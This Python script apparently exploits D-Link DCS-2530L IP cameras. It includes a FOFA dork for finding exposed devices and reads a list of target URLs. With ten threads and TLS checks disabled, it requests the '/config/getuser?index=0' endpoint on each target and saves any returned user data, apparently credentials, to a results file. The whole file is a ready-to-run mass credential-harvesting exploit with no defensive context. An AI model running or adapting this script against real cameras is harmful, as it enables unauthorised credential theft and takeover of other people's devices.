#!/usr/bin/python3
#fofa dork: app="D_Link-DCS-2530L"

import requests
import sys
from time import sleep
import random
import threading
from queue import Queue
from urllib3.exceptions import InsecureRequestWarning

def main(target,report):
	report = report
	headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36"
            }
	while queue.empty() is not True:
		rsss = "error"
		url = target.get()
		try:
			requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
			response = requests.get(url = url,headers = headers,verify = False,timeout =10)
			rsss = response.status_code
		except Exception as e:
			print("[-] Server error")
		if rsss == 200:
			with open(report, 'a+') as r:
				r.write(url + '\n')
				r.write(response.text + '\n')
				print(response.text)
		else:
			print("[-] Target is not vuln")

def get_target(filename):
	filename = filename
	target = open(filename, 'r')
	targets = target.readlines()
	target.close()
	for u in targets:
		u = u.replace("\r", "").replace("\n", "")
		payload = "{}/config/getuser?index=0".format(u)
		queue.put(payload)

file = "url.txt"
report = "result.txt"

if __name__ == '__main__':
	queue = Queue()
	get_target(file)
	for index in range(10):
		t = threading.Thread(target=main,args=(queue,report,))
		# t.daemon = True
		t.start()